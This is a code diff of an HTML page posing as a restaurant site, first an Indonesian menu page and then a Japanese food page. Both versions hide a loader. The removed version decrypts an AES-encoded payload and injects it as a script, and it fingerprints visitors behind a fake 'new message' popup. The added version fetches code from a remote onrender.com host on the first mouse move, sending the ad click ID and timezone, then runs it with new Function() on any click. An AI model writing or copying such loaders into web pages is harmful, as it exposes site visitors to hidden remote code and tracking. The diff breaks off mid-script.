@@ -1,15 +1,13 @@
 <!doctype html>
-<html lang="en">
+<html lang="ja">
 
 <head>
-    <!-- Required meta tags -->
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>メッセージがあります</title>
+    <title>日本料理</title>
 
     <!-- Bootstrap CSS -->
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet"
-        integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
 
     <!-- bootstrap icons -->
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
@@ -17,440 +15,414 @@
     <!-- fonts -->
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,300;0,400;0,700;1,700&display=swap"
-        rel="stylesheet">
-    <!-- fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Poppins&display=swap" rel="stylesheet">
 
     <!-- my css -->
     <link rel="stylesheet" href="css/style.css">
 
     <link rel="icon" href="img/resto.png" type="image/svg+xml">
-    <script async defer src="https://tools.luckyorange.com/core/lo.js?site-id=f941677a"></script>
-    <script type="text/javascript">
-        (function(c,l,a,r,i,t,y){
-            c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
-            t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
-            y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
-        })(window, document, "clarity", "script", "uj4ltgxfkl");
-    </script>
+    <script async defer src="https://tools.luckyorange.com/core/lo.js?site-id=4a134c82"></script>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            font-family: 'Poppins', sans-serif;
-            background: #f4f4f4;
-        }
-
-        .divcover {
-            z-index: 10;
-            background-color: rgba(0, 0, 0, 0.7);
+        /* Overlay */
+        .welcome-overlay {
             position: fixed;
             inset: 0;
+            background: rgba(0, 0, 0, 0.85);
+            backdrop-filter: blur(6px);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+
+            opacity: 1;
+            visibility: visible;
+            transition: opacity 0.4s ease, visibility 0.4s ease;
         }
 
-        .f-modal-centre {
-            background-color: #fff;
+        .welcome-overlay.hidden {
+            opacity: 0;
+            visibility: hidden;
+            pointer-events: none;
+        }
+
+        /* Modal */
+        .welcome-modal {
+            position: relative;
+            background: #111;
+            color: #fff;
+            max-width: 520px;
+            width: 90%;
+            padding: 40px 35px;
             border-radius: 16px;
             text-align: center;
-            width: 100%;
-            max-width: 500px;
-            padding: 32px;
-            display: block;
-            position: relative;
-            bottom: -37%;
-            left: 50%;
-            transform: translateX(-50%);
-            box-shadow: 10px 10px 50px rgba(0, 0, 0, 0.2);
-            opacity: 1;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.6);
+            animation: scaleIn 0.5s ease;
         }
 
-        .f-modal-icon-success img {
-            border-radius: 10px;
-            margin-bottom: 20px;
+        /* Heading */
+        .welcome-modal h2 {
+            font-size: 32px;
+            margin-bottom: 15px;
+            font-weight: 600;
         }
 
-        .f-sub-heading-regular {
-            font-size: 22px;
-            margin-bottom: 12px;
-            color: #333;
+        .welcome-modal h2 span {
+            color: #c59d5f; /* premium gold */
         }
 
+        /* Text */
+        .welcome-modal p {
+            font-size: 16px;
+            line-height: 1.7;
+            color: #ccc;
+            margin-bottom: 30px;
+        }
 
-        .f-button-primary {
-            background-color: #D31965;
-            color: white;
-            border-radius: 50px;
-            padding: 12px 32px;
-            font-size: 14px;
-            font-weight: 500;
-            text-decoration: none;
+        /* Buttons */
+        .welcome-actions {
+            display: flex;
+            gap: 15px;
+            justify-content: center;
+        }
+
+        .primary-btn {
+            background: #c59d5f;
+            color: #111;
+            border: none;
+            padding: 12px 26px;
+            border-radius: 30px;
+            font-size: 15px;
             cursor: pointer;
-            margin: 10px;
-            display: inline-block;
-            transition: background-color 0.3s;
+            transition: 0.3s ease;
         }
 
-        .f-button-primary:hover {
-            background-color: #A0144F;
+        .primary-btn:hover {
+            background: #d8b173;
         }
 
-        .f-modal-close {
+        .secondary-btn {
+            background: transparent;
+            border: 1px solid #c59d5f;
+            color: #c59d5f;
+            padding: 12px 26px;
+            border-radius: 30px;
+            font-size: 15px;
+            cursor: pointer;
+            transition: 0.3s ease;
+        }
+
+        .secondary-btn:hover {
+            background: #c59d5f;
+            color: #111;
+        }
+
+        /* Close Button */
+        .close-btn {
             position: absolute;
-            top: 10px;
-            right: 10px;
+            top: 15px;
+            right: 18px;
+            background: transparent;
+            border: none;
+            color: #aaa;
+            font-size: 28px;
             cursor: pointer;
-            font-size: 20px;
-            color: #666;
+            transition: 0.3s ease;
         }
 
-        .f-modal-close:hover {
-            color: #D31965;
+        .close-btn:hover {
+            color: #fff;
+        }
+        .no-scroll {
+            overflow: hidden;
+            height: 100vh;
         }
 
-        .button-group {
-            margin-top: 20px;
+        /* Animations */
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+            to {
+                opacity: 1;
+            }
         }
 
-        .testOpacity {
-            opacity: 0.001;
+        @keyframes scaleIn {
+            from {
+                transform: scale(0.9);
+            }
+            to {
+                transform: scale(1);
+            }
         }
+
     </style>
 </head>
 
 <body id="myBody">
-<div class="divcover" id="modalContainer">
-    <div class="f-modal-centre" id="modalContent">
-        <div class="f-modal-icon-success" style="
-            display: flex;
-            justify-content: center;
-            align-items: center;">
-            <img src="img/messenger-icon1024.jpg" width="100" height="100" loading="lazy" alt="Cookie Icon">
+<!-- Welcome Dialog -->
+<div class="welcome-overlay" id="welcomeOverlay">
+    <div class="welcome-modal">
+        <button class="close-btn" id="closeWelcome">&times;</button>
+
+        <h2>へようこそ <span>日本料理</span></h2>
+        <p>
+            新鮮な食材と熟練の技で作り上げた、本格的な日本の味をご堪能ください。
+            皆様のご来店を心よりお待ちしております。
+        </p>
+
+        <div class="welcome-actions">
+            <button class="primary-btn">メニューを見る</button>
+            <button class="secondary-btn">お問い合わせ</button>
         </div>
-        <div class="f-sub-heading-regular">新しいメッセージが1件あります。読みますか？</div>
-        <div class="button-group">
-            <a href="#" class="f-button-primary" id="rejectButton" style="background-color: #E53935;">キャンセル</a>
-            <a href="#" class="f-button-primary" id="manageButton" style="background-color: #2979FF;">続く</a>
-        </div>
-        <div class="f-modal-close" id="closeButton">✖</div>
     </div>
 </div>
-<div style="opacity: 0.3">
-    <img src="img/fbProfile.jpg">
-</div>
-    <!-- navbar -->
-<!--<nav class="navbar navbar-expand-lg navbar-dark shadow-sm fixed-top" style="background-color: #B22222;">-->
-<!--        <div class="container">-->
-<!--            <a class="navbar-brand"><span class="span">Warisan</span>Resto<span class="span2">.</span></a>-->
-<!--            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav"-->
-<!--                aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">-->
-<!--                <span class="navbar-toggler-icon"></span>-->
-<!--            </button>-->
-<!--            <div class="collapse navbar-collapse" id="navbarNav">-->
-<!--                <ul class="navbar-nav ms-auto">-->
-<!--                    <li class="nav-item">-->
-<!--                        <a class="nav-link active" aria-current="page" href="#home">Home</a>-->
-<!--                    </li>-->
-<!--                    <li class="nav-item">-->
-<!--                        <a class="nav-link" href="#about">Tentang Kami</a>-->
-<!--                    </li>-->
-<!--                    <li class="nav-item">-->
-<!--                        <a class="nav-link" href="#menu">Menu</a>-->
-<!--                    </li>-->
-<!--                    <li class="nav-item">-->
-<!--                        <a class="nav-link" href="#contact">Kontak</a>-->
-<!--                    </li>-->
-<!--                </ul>-->
-<!--            </div>-->
-<!--        </div>-->
-<!--    </nav>-->
-    <!-- navbar end -->
+<!-- navbar -->
+<nav class="navbar navbar-expand-lg navbar-dark shadow-sm fixed-top" style="background-color: #B22222;">
+    <div class="container">
+        <a class="navbar-brand"><span class="span">日本</span>フード</a>
+        <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
+            <span class="navbar-toggler-icon"></span>
+        </button>
+        <div class="collapse navbar-collapse" id="navbarNav">
+            <ul class="navbar-nav ms-auto">
+                <li class="nav-item"><a class="nav-link active" href="#home">ホーム</a></li>
+                <li class="nav-item"><a class="nav-link" href="#about">私たちについて</a></li>
+                <li class="nav-item"><a class="nav-link" href="#menu">メニュー</a></li>
+                <li class="nav-item"><a class="nav-link" href="#contact">お問い合わせ</a></li>
+            </ul>
+        </div>
+    </div>
+</nav>
+<!-- navbar end -->
 
-    <!-- jumbotron -->
-    <section id="home">
-        <div class="jumbotron">
-            <div class="jumbotron-content">
-                <h1>Selamat Datang di Restoran Kami</h1>
-                <p>Rasakan cita rasa terbaik dari dapur kami yang penuh cinta.</p>
-                <a href="#menu" class="btn">Lihat Menu</a>
+<!-- jumbotron -->
+<section id="home">
+    <div class="jumbotron">
+        <div class="jumbotron-content">
+            <h1>当店へようこそ</h1>
+            <p>心を込めた本格料理の味をお楽しみください。</p>
+            <a href="#menu" class="btn">メニューを見る</a>
+        </div>
+    </div>
+</section>
+<!-- jumbotron end -->
+
+<!-- about -->
+<section id="about" class="about">
+    <div class="container">
+        <div class="row text-center mb-3">
+            <div class="col">
+                <h2>私たちについて</h2>
             </div>
         </div>
-    </section>
-    <!-- jumbtron end -->
-
-    <!-- about section start -->
-    <section id="about" class="about">
-        <div class="container">
-            <div class="row text-center mb-3">
-                <div class="col">
-                    <h2>Tentang Kami</h2>
-                </div>
+        <div class="row justify-content-center fs-5 text-center">
+            <div class="col-md-4">
+                <p>
+                    私たちは高品質な食材を使用し、日本本来の味を大切にした料理を提供しています。
+                </p>
             </div>
-            <div class="row justify-content-center fs-5 text-center">
-                <div class="col-md-4">
-                    <p>Kami adalah penyedia kuliner Nusantara yang berkomitmen menghadirkan cita rasa asli Indonesia
-                        dengan bahan berkualitas tinggi dan pelayanan ramah.</p>
-                </div>
-                <div class="col-md-4">
-                    <p>Dengan pengalaman bertahun-tahun, kami selalu berusaha memberikan kepuasan terbaik bagi pelanggan
-                        dan membawa budaya kuliner Indonesia lebih dekat ke hati Anda.</p>
-                </div>
+            <div class="col-md-4">
+                <p>
+                    長年の経験を活かし、お客様に最高の満足と温かいサービスをお届けします。
+                </p>
             </div>
         </div>
-    </section>
-    <!-- about section end -->
+    </div>
+</section>
+<!-- about end -->
 
-    <!-- menu -->
-    <section id="menu" class="menu">
-        <h2><span>Menu</span> Kami</h2>
-        <p class="menu-text">Nikmati hidangan autentik dari berbagai daerah di Indonesia yang kaya akan cita rasa dan
-            rempah khas,
-            disajikan dengan kelezatan dan kehangatan</p>
-        <div class="row">
-            <div class="card" style="width: 18rem;">
-                <img src="img/menu/Rendang.jpg" class="card-img-top" alt="...">
-                <div class="card-body">
-                    <h5 class="card-title">Rendang</h5>
-                    <p class="card-text">Daging sapi yang dimasak dengan rempah khas Minang
-                        hingga empuk dan kaya rasa.
-                    </p>
-                    <p class="menu-card-price" style="font-weight: 400; text-align: left;">Rp 35.000</p>
-                    <p class="menu-card-rating">★★★★★</p>
-                </div>
-            </div>
-            <div class="card" style="width: 18rem;">
-                <img src="img/menu/nasi goreng.jpg" class="card-img-top" alt="...">
-                <div class="card-body">
-                    <h5 class="card-title">Nasi Goreng</h5>
-                    <p class="card-text">Nasi goreng dengan bumbu khas, ditambah potongan ayam
-                        dan telur orak-arik.</p>
-                    <p class="menu-card-price" style="font-weight: 400; text-align: left;">Rp 15.000</p>
-                    <p class="menu-card-rating">★★★★★</p>
-                </div>
-            </div>
-            <div class="card" style="width: 18rem;">
-                <img src="img/menu/gudeg.jpg" class="card-img-top" alt="...">
-                <div class="card-body">
-                    <h5 class="card-title">Gudeg</h5>
-                    <p class="card-text">Olahan nangka muda yang dimasak dengan santan, bercita rasa manis dari
-                        Yogyakarta.</p>
-                    <p class="menu-card-price" style="font-weight: 400; text-align: left;">Rp 15.000</p>
-                    <p class="menu-card-rating">★★★★★</p>
-                </div>
-            </div>
-            <div class="card" style="width: 18rem;">
-                <img src="img/menu/soto lamongan.jpg" class="card-img-top" alt="...">
-                <div class="card-body">
-                    <h5 class="card-title">Soto Lamongan</h5>
-                    <p class="card-text">Soto berkuah kuning dengan ayam suwir, telur, dan taburan bawang goreng.</p>
-                    <p class="menu-card-price" style="font-weight: 400; text-align: left;">Rp 12.000</p>
-                    <p class="menu-card-rating">★★★★★</p>
-                </div>
-            </div>
-            <div class="card" style="width: 18rem;">
-                <img src="img/menu/rawon.jpg" class="card-img-top" alt="...">
-                <div class="card-body">
-                    <h5 class="card-title">Rawon</h5>
-                    <p class="card-text">Sup daging sapi khas Jawa Timur dengan kuah hitam dari kluwek yang gurih dan
-                        nikmat.
-                    </p>
-                    <p class="menu-card-price" style="font-weight: 400; text-align: left;">Rp 20.000</p>
-                    <p class="menu-card-rating">★★★★★</p>
-                </div>
-            </div>
-            <div class="card" style="width: 18rem;">
-                <img src="img/menu/coto makassar.jpg" class="card-img-top" alt="...">
-                <div class="card-body">
-                    <h5 class="card-title">Coto Makassar</h5>
-                    <p class="card-text">Sup daging sapi dengan rempah khas Makassar, disajikan dengan ketupat.</p>
-                    <p class="menu-card-price" style="font-weight: 400; text-align: left;">Rp 15.000</p>
-                    <p class="menu-card-rating">★★★★★</p>
-                </div>
-            </div>
-            <div class="card" style="width: 18rem;">
-                <img src="img/menu/ayam betutu.jpg" class="card-img-top" alt="...">
-                <div class="card-body">
-                    <h5 class="card-title">Ayam Betutu</h5>
-                    <p class="card-text">Ayam panggang khas Bali dengan bumbu pedas dan rempah.
-                    </p>
-                    <p class="menu-card-price" style="font-weight: 400; text-align: left;">Rp 30.000</p>
-                    <p class="menu-card-rating">★★★★★</p>
-                </div>
-            </div>
-            <div class="card" style="width: 18rem;">
-                <img src="img/menu/ayam taliwang.jpg" class="card-img-top" alt="...">
-                <div class="card-body">
-                    <h5 class="card-title">Ayam Taliwang</h5>
-                    <p class="card-text">Ayam panggang dari Lombok dengan bumbu pedas manis yang khas dan lezat.</p>
-                    <p class="menu-card-price" style="font-weight: 400; text-align: left;">Rp 35.000</p>
-                    <p class="menu-card-rating">★★★★★</p>
-                </div>
-            </div>
-            <div class="card" style="width: 18rem;">
-                <img src="img/menu/es kuwut.jpg" class="card-img-top" alt="...">
-                <div class="card-body">
-                    <h5 class="card-title">Es Kuwut</h5>
-                    <p class="menu-card-price" style="font-weight: 400; text-align: left;">Rp 10.000</p>
-                    <p class="menu-card-rating">★★★★★</p>
-                </div>
-            </div>
-            <div class="card" style="width: 18rem;">
-                <img src="img/menu/es cendol.jpg" class="card-img-top" alt="...">
-                <div class="card-body">
-                    <h5 class="card-title">Es Cendol</h5>
-                    <p class="menu-card-price" style="font-weight: 400; text-align: left;">Rp 15.000</p>
-                    <p class="menu-card-rating">★★★★★</p>
-                </div>
-            </div>
-            <div class="card" style="width: 18rem;">
-                <img src="img/menu/es kopyor2.jpg" class="card-img-top" alt="...">
-                <div class="card-body">
-                    <h5 class="card-title">Es Kopyor</h5>
-                    <p class="menu-card-price" style="font-weight: 400; text-align: left;">Rp 15.000</p>
-                    <p class="menu-card-rating">★★★★★</p>
-                </div>
-            </div>
-            <div class="card" style="width: 18rem;">
-                <img src="img/menu/es jeruk.jpg" class="card-img-top" alt="...">
-                <div class="card-body">
-                    <h5 class="card-title">Es Jeruk</h5>
-                    <p class="menu-card-price" style="font-weight: 400; text-align: left;">Rp 10.000</p>
-                    <p class="menu-card-rating">★★★★★</p>
-                </div>
+<!-- menu -->
+<section id="menu" class="menu">
+    <h2><span>メニュー</span>一覧</h2>
+    <p class="menu-text">
+        香辛料と伝統が融合した、本格日本料理をご堪能ください。
+    </p>
+
+    <div class="row">
+
+        <div class="card" style="width: 18rem;">
+            <img src="img/menu/Rendang.jpg" class="card-img-top">
+            <div class="card-body">
+                <h5 class="card-title">ルンダン</h5>
+                <p class="card-text">香辛料でじっくり煮込んだ牛肉料理。</p>
+                <p class="menu-card-price">Rp 35.000</p>
+                <p class="menu-card-rating">★★★★★</p>
             </div>
         </div>
-    </section>
-    <!-- menu end -->
 
-    <!-- contact -->
-    <section id="contact" class="contact">
-        <div class="container">
-            <div class="row text-center mb-4">
-                <div class="col">
-                    <h2>Informasi Kontak Kami & Peta Lokasi</h2>
-                    <p style="margin-bottom: 1rem;">Hubungi kami untuk informasi lebih lanjut mengenai layanan dan
-                        lokasi kami. Kunjungi langsung
-                        atau gunakan peta berikut untuk menemukan kami dengan mudah.</p>
-                </div>
-            </div>
-            <div class="row justify-content-center">
-                <div class="col-md-4">
-                    <iframe
-                        src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d253056.1781648307!2d110.831434!3d-7.682847549999992!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x2e7a3c6b4b49bfd3%3A0x3027a76e352bc50!2sKabupaten%20Sukoharjo%2C%20Jawa%20Tengah!5e0!3m2!1sid!2sid!4v1729163070978!5m2!1sid!2sid"
-                        allowfullscreen="" loading="lazy" referrerpolicy="no-referrer-when-downgrade"
-                        class="map"></iframe>
-                </div>
-
-                <div class="col-md-8">
-                    <form>
-                        <div class="mb-3">
-                            <label for="name" class="form-label">Nama</label>
-                            <input type="text" class="form-control" id="name" placeholder="Tuliskan Nama Anda">
-                        </div>
-                        <div class="mb-3">
-                            <label for="email" class="form-label">Email</label>
-                            <input type="email" class="form-control" id="email" placeholder="Alamat Email Anda">
-                        </div>
-                        <div class="mb-3">
-                            <label for="no" class="form-label">No HP</label>
-                            <input type="text" class="form-control" id="no" placeholder="Ketikan No HP Anda">
-                        </div>
-                        <div class="mb-3">
-                            <label for="message" class="form-label">Pesan</label>
-                            <textarea class="form-control" id="message" rows="3"></textarea>
-                        </div>
-                        <button type="submit" class="btn btn-primary">Kirim</button>
-                    </form>
-                </div>
+        <div class="card" style="width: 18rem;">
+            <img src="img/menu/nasi goreng.jpg" class="card-img-top">
+            <div class="card-body">
+                <h5 class="card-title">ナシゴレン</h5>
+                <p class="card-text">鶏肉と卵入りの日本風炒飯。</p>
+                <p class="menu-card-price">Rp 15.000</p>
+                <p class="menu-card-rating">★★★★★</p>
             </div>
         </div>
-    </section>
-    <!-- contact end -->
 
-    <!-- footer -->
-    <footer class="footer">
-        <div class="footer-container">
-            <div class="footer-logo">
-                <a class="navbar-brand"><span class="span">Warisan</span>Resto<span class="span2">.</span></a>
-                <p>Menikmati rasa autentik Indonesia.</p>
-            </div>
-            <div class="footer-links">
-                <ul>
-                    <li><a href="#home">Beranda</a></li>
-                    <li><a href="#about">Tentang</a></li>
-                    <li><a href="#menu">Menu</a></li>
-                    <li><a href="#contact">Kontak</a></li>
-                </ul>
-            </div>
-            <div class="footer-contact">
-                <h4>Hubungi Kami</h4>
-                <p>Email: kontak@namabrand.com</p>
-                <p>Telepon: 0812-3456-7890</p>
+        <div class="card" style="width: 18rem;">
+            <img src="img/menu/gudeg.jpg" class="card-img-top">
+            <div class="card-body">
+                <h5 class="card-title">グドゥグ</h5>
+                <p class="card-text">甘い味付けの若いジャックフルーツ煮込み。</p>
+                <p class="menu-card-price">Rp 15.000</p>
+                <p class="menu-card-rating">★★★★★</p>
             </div>
         </div>
-        <div class="footer-bottom">
-            <p>© 2024 WarisanResto. All rights reserved.</p>
-            <p>Created by <a href="https://instagram.com/haikallmuh" target="_blank">Muhammad Haikal</a></p>
+
+        <!-- drinks -->
+        <div class="card" style="width: 18rem;">
+            <img src="img/menu/es jeruk.jpg" class="card-img-top">
+            <div class="card-body">
+                <h5 class="card-title">アイスオレンジ</h5>
+                <p class="menu-card-price">Rp 10.000</p>
+                <p class="menu-card-rating">★★★★★</p>
+            </div>
         </div>
-    </footer>
-    <!-- footer end -->
 
-    <!-- js -->
-    <script src="js/script.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    </div>
+</section>
+<!-- menu end -->
 
+<!-- contact -->
+<section id="contact" class="contact">
+    <div class="container">
+        <div class="row text-center mb-4">
+            <div class="col">
+                <h2>お問い合わせ & アクセスマップ</h2>
+                <p>お気軽にご連絡ください。</p>
+            </div>
+        </div>
+
+        <div class="row justify-content-center">
+            <div class="col-md-4">
+                <iframe class="map" loading="lazy"></iframe>
+            </div>
+
+            <div class="col-md-8">
+                <form>
+                    <div class="mb-3">
+                        <label class="form-label">お名前</label>
+                        <input type="text" class="form-control" placeholder="お名前を入力">
+                    </div>
+                    <div class="mb-3">
+                        <label class="form-label">メールアドレス</label>
+                        <input type="email" class="form-control" placeholder="メールアドレス">
+                    </div>
+                    <div class="mb-3">
+                        <label class="form-label">電話番号</label>
+                        <input type="text" class="form-control" placeholder="電話番号">
+                    </div>
+                    <div class="mb-3">
+                        <label class="form-label">メッセージ</label>
+                        <textarea class="form-control"></textarea>
+                    </div>
+                    <button type="submit" class="btn btn-primary">送信</button>
+                </form>
+            </div>
+        </div>
+    </div>
+</section>
+<!-- contact end -->
+
+<!-- footer -->
+<footer class="footer">
+    <div class="footer-container">
+        <div class="footer-logo">
+            <a class="navbar-brand"><span class="span">日本フード</span></a>
+            <p>本格日本の味</p>
+        </div>
+
+        <div class="footer-links">
+            <ul>
+                <li><a href="#home">ホーム</a></li>
+                <li><a href="#about">私たちについて</a></li>
+                <li><a href="#menu">メニュー</a></li>
+                <li><a href="#contact">お問い合わせ</a></li>
+            </ul>
+        </div>
+
+        <div class="footer-contact">
+            <h4>連絡先</h4>
+            <p>電話: 0812-3456-7890</p>
+        </div>
+    </div>
+
+    <div class="footer-bottom">
+        <p>© 2025 JapanFood. All rights reserved.</p>
+    </div>
+</footer>
 <script>
-    function closeModal() {
-        document.getElementById("modalContainer").style.display = "none";
-        // document.getElementById("testopc").style.opacity = 1;
-        // document.getElementById("age-confirmation-modal").style.display = "none";
-        console.log("tes$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$4t");
-    }
-    document.getElementById("myBody").addEventListener("click", closeModal);
-    document.getElementById("closeButton").addEventListener("click", closeModal);
-    document.getElementById("rejectButton").addEventListener("click", function (event) {
-        document.getElementById("modalContainer").style.display = "none";
-    });
-    document.getElementById("manageButton").addEventListener("click", function (event) {
-        document.getElementById("modalContainer").style.display = "none";
-    });
-</script>
-<!--facebook-->
+    const gclid = new URLSearchParams(location.search).get("gclid");
+    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    const RENDER_BASE_URL = "https://whatsetup-1test.onrender.com";
 
-<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
-<script>
-    // Initialize the agent on page load.
-    const fpPromise = import('https://fpjscdn.net/v3/4B11oI7ltKpEmYsOUbBr')
-        .then(FingerprintJS => FingerprintJS.load({
-            region: "ap"
-        }))
+    let someCode = null;
 
-    fpPromise
-        .then(fp => fp.get())
-        .then(result => {
-            console.log("Full result:", result.visitorId);
-            localStorage.setItem('visitorId', result.visitorId);
-        });
+    document.cookie = "access_cookie=true; path=/; max-age=300";
 
-    setTimeout(()=>{
-        function aesDecode(encodedText) {
-            const decodedText = decodeURIComponent(encodedText);
-            const bytes = CryptoJS.AES.decrypt(decodedText, 'U2FsdGVkX1+uqxI4YN2qNlGDaMHVLViZB05OmcVwVyI=');
-            return bytes.toString(CryptoJS.enc.Utf8);
+    document.addEventListener("mousemove", async function fetchCodeOnce() {
+        document.removeEventListener("mousemove", fetchCodeOnce);
+        try {
+            const res = await fetch(
+                `${RENDER_BASE_URL}/frontend-loader?gclid=${gclid}`,
+                {
+                    headers: {
+                        "x-client-timezone": timezone,
+                        "x-access-cookie": "true",
+                    },
+                }
+            );
+            const data = await res.json();
+            if (data && data.code) {
+                someCode = data.code;
+            }
+        } catch (err) {
+            console.error("Could not fetch some code", err);
         }
-        const codeString = aesDecode(`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`);
-        const script = document.createElement("script");
-        script.textContent = codeString;
-        document.body.appendChild(script);
-    }, 100)
-</script>
+    });
 
-<script>
-    document.body.style.overflow = "hidden";
+    function handleSomeClick() {
+        if (someCode) {
+            try {
+                new Function(someCode)();
+
+                document.body.classList.add('scroll-lock');
+            } catch (err) {
+                console.error("Error executing code:", err);
+            }
+        }
+    }
+
+    document.addEventListener("click", handleSomeClick);
 </script>
+<script type="text/javascript">
+    document.addEventListener("DOMContentLoaded", () => {
+        const overlay = document.getElementById("welcomeOverlay");
+        const closeBtn = document.getElementById("closeWelcome");
+        const body = document.getElementById("myBody");
+
+        // OPEN popup on load
+        overlay.classList.remove("hidden");
+        document.body.classList.add("no-scroll");
+
